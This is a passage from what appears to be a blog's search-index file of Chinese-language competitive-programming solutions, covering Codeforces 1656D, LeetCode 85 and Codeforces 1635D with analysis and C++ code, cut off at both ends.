function">dfs</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> color <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//    freopen("in.txt", "r", stdin);</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> t<span class="token punctuation">,</span> u<span class="token punctuation">,</span> v<span class="token punctuation">;</span>    cin <span class="token operator">>></span> t<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>t<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> n<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        vis <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            cin <span class="token operator">>></span> u <span class="token operator">>></span> v<span class="token punctuation">;</span>            G<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>            G<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            cout <span class="token operator">&lt;&lt;</span> ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CF1656D K-good</title>
      <link href="/2022/03/29/cf1656d-k-good/"/>
      <url>/2022/03/29/cf1656d-k-good/</url>
      
        <content type="html"><![CDATA[<h1 id="CF1656D-K-good"><a href="#CF1656D-K-good" class="headerlink" title="CF1656D K-good"></a>CF1656D K-good</h1><p><a href="https://codeforces.com/contest/1656/problem/D">题目链接</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>一个数字 $n$ 是 $k-good$ 的，则它满足如下 2 个必要条件：</p><ul><li>$n \geq 1+2+…+k=\frac{k(1+k)}{2}$</li><li>$n \equiv 1+2+…+k \equiv \frac{k(1+k)}{2}(mod\ k)$</li></ul><ol><li>若 $k$ 是偶数，则第二个必要条件可转化为 $n \equiv \frac{k(1+k)}{2} \equiv \frac{k}{2}(1+k) \equiv \frac{k}{2} (mod\ k)$，即 $2n\equiv 0(mod\ k)$。另，由第二个必要条件可得 $n \neq 0(mod\ k)$。在满足这两个条件的前提下，寻找最小的 $k$（为了尽可能满足第一个必要条件）：设将 $n$ 质因数分解后，$2$ 的指数为 $v_2$（即$n=2^{v_2}3^{v_3}5^{v_5}…$），则 $k_{min}=2^{v_2+1}$。若 $k_{min}$ 仍不满足第一个必要条件，则考虑 $k$ 为奇数的情况。</li><li>若 $k$ 是奇数，则第二个必要条件可转化为 $n \equiv \frac{k(k+1)}{2}(mod\ k)$，即 $n=\frac{k(k+1)}{2}+tk$，$2n=k(k+1)+2tk=k(k+1+2t)=kk_1$（设 $k_1=k+1+2t$，易知其为偶数），且由于策略 2 是由于策略 1 失效才进入，故明显有 $n&lt;\frac{k_1(k_1+1)}{2}, 2n=kk_1&lt;k_1(k_1+1), k&lt;k_1+1$，且由于 $k$ 是奇数，$k_1$ 是偶数，故有 $k &lt; k_1$，则 $\frac{k(k+1)}{2} \leq \frac{kk_1}{2} = n$，即 $k$ 肯定满足必要条件一（唯一的限制条件是 $k&gt;1$）。</li><li>现在考虑答案是 <code>-1</code> 的情况。若 $n=2^t$，对于策略 1，$k_{min}=2^{t+1}&gt;n$，不满足必要条件一；对于策略 2，由于 $k$ 是奇数，且 $2n=kk_1=2^{t+1}$，故 $k$ 只能是 1，不成立。</li></ol><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">long</span> <span class="token keyword">long</span> LL<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> MAXN <span class="token operator">=</span> <span class="token number">110</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// freopen("in.txt", "r", stdin);</span>     <span class="token keyword">int</span> t<span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>t<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        LL n<span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%lld"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        LL ji<span class="token operator">=</span>n<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>ji<span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>  ji<span class="token operator">/=</span><span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ji<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"-1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        LL k<span class="token operator">=</span>n<span class="token operator">/</span>ji<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">&lt;=</span><span class="token number">2e9</span> <span class="token operator">&amp;&amp;</span> k<span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span>k<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token operator">&lt;=</span>n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%lld\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%lld\n"</span><span class="token punctuation">,</span> ji<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode#85 最大矩阵</title>
      <link href="/2022/03/14/leetcode-85-zui-da-ju-zhen/"/>
      <url>/2022/03/14/leetcode-85-zui-da-ju-zhen/</url>
      
        <content type="html"><![CDATA[<h1 id="leetcode-85-最大矩阵"><a href="#leetcode-85-最大矩阵" class="headerlink" title="leetcode#85 最大矩阵"></a>leetcode#85 最大矩阵</h1><p><a href="https://leetcode-cn.com/problems/maximal-rectangle/">题目链接</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li><p>预处理好$f$ 函数，其含义如下：</p><pre class="line-numbers language-none"><code class="language-none">f[i][j][k]&#x3D;    从 Matrix[i][j] 往上数有多少个连续的1, k&#x3D;0      从 Matrix[i][j] 往左数有多少个连续的1, k&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>接下来遍历整个矩阵的各个位置时，考虑以这个矩阵为右下角，能往左和往上扩展的最大矩阵的面积是多少，维护一个单调栈即可。</p></li></ul><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">205</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">205</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 0,row; 1,col.</span>    <span class="token keyword">int</span> <span class="token function">maximalRectangle</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token operator">&amp;</span> matrix<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> rows <span class="token operator">=</span> matrix<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> cols <span class="token operator">=</span> matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> ans<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token char">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>            ans<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>rows<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token char">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            ans<span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>ans<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>cols<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token char">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            ans<span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>ans<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>rows<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>cols<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token char">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>rows<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>cols<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token char">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">int</span> tmp1<span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token keyword">int</span> tmp2<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>                    ans<span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span>tmp1<span class="token operator">*</span>tmp2<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">while</span><span class="token punctuation">(</span>j<span class="token operator">-</span>tmp2<span class="token operator">>=</span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> tmp1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        tmp1<span class="token operator">=</span><span class="token function">min</span><span class="token punctuation">(</span>tmp1<span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span>tmp2<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        tmp2<span class="token operator">++</span><span class="token punctuation">;</span>                        ans<span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span>tmp1<span class="token operator">*</span>tmp2<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                    tmp1<span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    tmp2<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>                    <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">-</span>tmp2<span class="token operator">>=</span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> tmp1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        tmp1<span class="token operator">=</span><span class="token function">min</span><span class="token punctuation">(</span>tmp1<span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span>tmp2<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        tmp2<span class="token operator">++</span><span class="token punctuation">;</span>                        ans<span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span>tmp1<span class="token operator">*</span>tmp2<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> ans<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 单调栈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CF1635D Infinite Set</title>
      <link href="/2022/03/04/cf1635d-infinite-set/"/>
      <url>/2022/03/04/cf1635d-infinite-set/</url>
      
        <content type="html"><![CDATA[<h1 id="CF1635D-Infinite-Set"><a href="#CF1635D-Infinite-Set" class="headerlink" title="CF1635D Infinite Set"></a>CF1635D Infinite Set</h1><p><a href="http://codeforces.com/contest/1635/problem/D">题目链接</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li><p>计数题。</p></li><li><p>三种操作的本质：</p><pre class="line-numbers language-none"><code class="language-none">1. 将 a[1...n] 全放入 S 中2. 从 S 中取出一个元素, 左移 1 位然后加 1, 放回 S3. 从 S 中取出一个元素, 左移 2 位, 放回 S<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>最终，S中所有的元素均是由 <code>a[1..n]</code>经过后2种操作扩展出来的。易知，操作2会使数字的二进制表示长度加1，操作3会使长度加2。由于S中的数字必须小于$2^p$，所以若一个数字的二进制表示长度为 <code>blen</code>，则可供其扩展的长度为 <code>p - blen</code>。另外，我们可以用DP计算$f(x)$，表示若可供扩展的长度为$x$，最多可以生成$f(x)$个不同的数字。</p></li><li><p>DP的计算方法：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>MAXN<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>MOD<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>MAXN<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>MOD<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>去重。在 <code>a[1...n]</code> 